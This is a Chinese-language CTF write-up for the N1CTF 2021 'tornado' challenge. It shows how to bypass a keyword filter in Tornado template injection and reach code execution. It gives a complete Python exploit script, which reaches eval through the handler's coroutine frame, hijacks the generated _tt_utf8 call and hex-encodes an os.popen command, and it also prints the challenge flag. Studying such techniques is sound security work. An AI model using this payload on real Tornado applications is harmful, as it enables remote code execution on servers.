# N1CTF 2021 - tornado

## 题目简述

应用把 POST 参数 `data` 写入临时模板，再调用 Tornado 的 `render()`：

```python
data = self.get_argument('data')
if filter(data):
    f.write(data)
    self.render(f'uploads/{id}.html')
```

过滤器先做 NFKD 归一化，限制长度为 1024，并拒绝 `__`、圆括号、`datetime`、`sys`、`import` 以及任何完整的 Python 内建名称。目标是在不能显式写函数调用的条件下，通过 Tornado 模板编译过程获得代码执行，最后运行 SUID `/readflag`。

## 解题过程

### 找到未被过滤的 eval 引用

Tornado 模板默认暴露 `handler`。沿请求连接、协程帧继续访问，可以到达当前 Python 帧的 `f_builtins`：

```python
handler.request.server_connection._serving_future._coro.cr_frame.f_builtins
```

过滤器会拒绝完整单词 `eval`，但不会在 Python 运行前求值字符串拼接，因此可以写成：

```python
handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']
```

这样已经取得 `eval` 函数，但过滤器同时禁止 `(` 和 `)`，还不能直接调用它。

### 劫持模板生成代码中的隐式调用

Tornado 不直接解释模板，而是先把 `{% raw expression %}` 编译成 Python。其生成代码大致如下：

```python
_tt_tmp = expression
if isinstance(_tt_tmp, _tt_string_types):
    _tt_tmp = _tt_utf8(_tt_tmp)
else:
    _tt_tmp = _tt_utf8(str(_tt_tmp))
_tt_append(_tt_tmp)
```

因此无需在输入里写圆括号：只要利用 `raw` 指令打断原有表达式，将 `_tt_utf8` 变量改成刚才找到的 `eval`，模板引擎自己就会执行 `_tt_utf8(_tt_tmp)`，替攻击者完成函数调用。第一次 `raw` 后再插入第二个 `raw`，把 `_tt_utf8` 恢复为 `lambda x:x`，可以让模板尾部正常返回。

### 编码危险表达式并构造请求

真正需要求值的表达式包含 `__import__` 和圆括号，不能明文通过过滤。将每个字符写成 `\xNN`，过滤阶段只能看到十六进制转义文本；模板被编译为 Python 后，字符串字面量才还原为原表达式。

```python
import requests

command = "__import__('os').popen('/readflag').read()"
encoded = ''.join('\\x{:02x}'.format(ord(c)) for c in command)

payload = """{{% raw "{}"
    _tt_utf8 = handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['ev'+'al']%}}{{% raw 1
    _tt_utf8 = lambda x:x
%}}
""".format(encoded)

r = requests.post('http://TARGET/', data={'data': payload})
print(r.text)
```

代码中的 `{{` 和 `}}` 是 Python `str.format()` 对字面量花括号的转义；实际发送的模板指令是 `{% raw ... %}`。`requests` 会处理表单编码，无须手工把 `+` 改成 `%2b`。

源码中的应用监听容器内 `8888` 端口，官方 EXP 的 `127.0.0.1:5000` 只是作者本地映射地址，复现时应以实际映射后的 `TARGET` 为准。Dockerfile 直接写入了预期 flag，因此结果可以与源码核对：

```text
n1ctf{t0rn4d0_decim4tes_tr4iler_p4rk}
```

## 方法总结

本题的两个关键点分别是从 `handler` 对象图到达协程帧的 `f_builtins`，以及利用 Tornado 模板生成代码中的 `_tt_utf8(_tt_tmp)` 完成隐式函数调用。字符串拼接绕过完整内建名检查，十六进制转义推迟危险表达式的还原，而 `raw` 指令负责改变生成代码的局部变量。防御上不应依赖关键字黑名单来约束模板；用户内容必须与模板源码分离，并作为普通数据传入已经固定的模板。
